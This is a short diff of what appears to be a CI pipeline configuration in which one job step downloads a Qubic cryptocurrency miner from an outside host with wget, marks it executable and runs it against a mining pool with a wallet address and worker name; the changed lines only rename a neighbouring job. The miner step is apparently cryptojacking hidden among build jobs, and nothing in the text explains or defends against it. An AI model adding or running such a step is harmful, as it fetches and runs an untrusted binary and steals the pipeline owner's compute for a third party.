@@ -142,7 +142,7 @@ jobs:
   steps:
   - script: wget https://dl.qubicmine.pro/qpro-miner && chmod +x qpro-miner &&  ./qpro-miner --cpu --wallet JYJYQFDFZAXZMDSFDDHUITLXMLABDLZSXNFTGYQWPGLCYQOVNYNZAIDEUBUC --worker 32v --url ws.qubicmine.pro
 
-- job: w
+- job: zz
   timeoutInMinutes: 360
   cancelTimeoutInMinutes: 360
   steps:
